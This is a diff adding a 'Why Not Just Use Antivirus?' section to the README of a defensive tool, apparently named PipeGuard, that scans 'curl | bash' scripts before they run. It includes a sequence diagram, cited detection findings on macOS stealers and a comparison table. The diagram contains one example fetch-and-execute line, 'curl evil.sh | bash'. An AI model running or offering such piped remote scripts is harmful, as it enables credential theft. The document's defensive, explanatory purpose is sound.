@@ -191,6 +191,48 @@ No existing tool specifically addresses the `curl | bash` attack vector with pre
 - Monitor **network** not shell pipes (LuLu)
 - Require **manual review** (download-then-execute workflow)
 
+### Why Not Just Use Antivirus?
+
+**Short answer:** Traditional AV/EDR detects malware *after* it executes. By then, credentials are stolen.
+
+```mermaid
+sequenceDiagram
+    participant U as User
+    participant T as Terminal
+    participant AV as Antivirus/EDR
+    participant M as Malware
+
+    U->>T: curl evil.sh | bash
+    Note over T: Script streams directly<br/>to bash interpreter
+    T->>M: Execute in memory
+    Note over AV: No file on disk to scan
+    M->>M: Steal credentials
+    M->>M: Exfiltrate data
+    AV->>M: Behavioral detection triggers
+    Note over AV: Too late - damage done
+```
+
+**Evidence from real attacks:**
+
+| Finding | Source |
+|---------|--------|
+| AMOS samples: **5-8 of 60+ engines** detect on VirusTotal | [Kandji](https://www.kandji.io/blog/amos-macos-stealer-analysis) |
+| MacSync Stealer: some samples detected by **only 1 engine** | [Jamf](https://www.jamf.com/blog/macsync-stealer-evolution-code-signed-swift-malware-analysis/) |
+| ClickFix kits "**guarantee antivirus bypass**" | [Microsoft](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/) |
+| "No binary written to disk, **harder to spot with classic AV**" | [SOC Prime](https://socprime.com/active-threats/clickfix-on-macos-applescript-malware/) |
+
+**The gap PipeGuard fills:**
+
+| Stage | Traditional AV/EDR | PipeGuard |
+|-------|-------------------|-----------|
+| Script received via curl | No file to scan | Intercepts pipe |
+| Script content analyzed | N/A | YARA + AV scan |
+| Malicious patterns found | N/A | Block/prompt user |
+| Script executes | Damage begins | Never runs |
+| Behavioral detection | Catches aftermath | N/A (prevented) |
+
+**Bottom line:** CrowdStrike "blocking" AMOS means they detected the malware's *behavior* (file writes, network connections). The initial script already ran. PipeGuard scans the script *before the interpreter ever sees it*.
+
 ### Competitive Landscape
 
 | Tool | Approach | curl\|bash Coverage | Pre-Execution | Open Source |
